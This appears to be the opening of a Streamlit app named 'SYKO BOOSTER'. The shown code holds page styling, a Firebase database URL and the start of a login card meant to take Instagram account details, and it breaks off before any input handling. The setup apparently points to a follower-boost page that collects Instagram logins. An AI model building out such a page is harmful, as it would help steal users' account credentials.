import streamlit as st
import requests
import time
import hashlib

# إعدادات الصفحة
st.set_page_config(page_title="SYKO BOOSTER", layout="centered")

# --- تصميم واجهة SYKO SYSTEM الحصرية ---
st.markdown("""
    <style>
    .main { background: #000000; }
    .stApp { background: #000000; }
    .login-card {
        background: rgba(15, 15, 15, 0.95);
        padding: 50px;
        border-radius: 25px;
        border: 2px solid #00f2ff;
        text-align: center;
        box-shadow: 0 0 30px rgba(0, 242, 255, 0.2);
    }
    .syko-logo {
        font-size: 45px;
        font-weight: 900;
        color: #fff;
        text-transform: uppercase;
        letter-spacing: 5px;
        margin-bottom: 5px;
        text-shadow: 0 0 15px #00f2ff;
    }
    .syko-tag {
        color: #00f2ff;
        font-size: 12px;
        margin-bottom: 30px;
        font-weight: bold;
    }
    input {
        background-color: #111 !important;
        color: #00f2ff !important;
        border: 1px solid #333 !important;
        border-radius: 10px !important;
        height: 45px !important;
    }
    .stButton>button {
        background: linear-gradient(45deg, #00f2ff, #0072ff);
        color: #000;
        font-weight: bold;
        border-radius: 12px;
        border: none;
        height: 50px;
        width: 100%;
        margin-top: 15px;
        transition: 0.3s;
    }
    .stButton>button:hover {
        box-shadow: 0 0 20px #00f2ff;
        color: #fff;
    }
    </style>
    """, unsafe_allow_html=True)

DB_URL = "https://syko-booster-default-rtdb.firebaseio.com/"

if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False

# --- واجهة الدخول (SYKO STYLE) ---
if not st.session_state.logged_in:
    st.markdown('<div class="login-card">', unsafe_allow_html=True)
    st.markdown('<div class="syko-logo">SYKO</div>', unsafe_allow_html=True)
    st.markdown('<div class="syko-tag">POWERED BY SYKO SYSTEM</div>', unsafe_allow_html=True)
    
    # حقول إدخال بيانات إنستقرام
    insta_
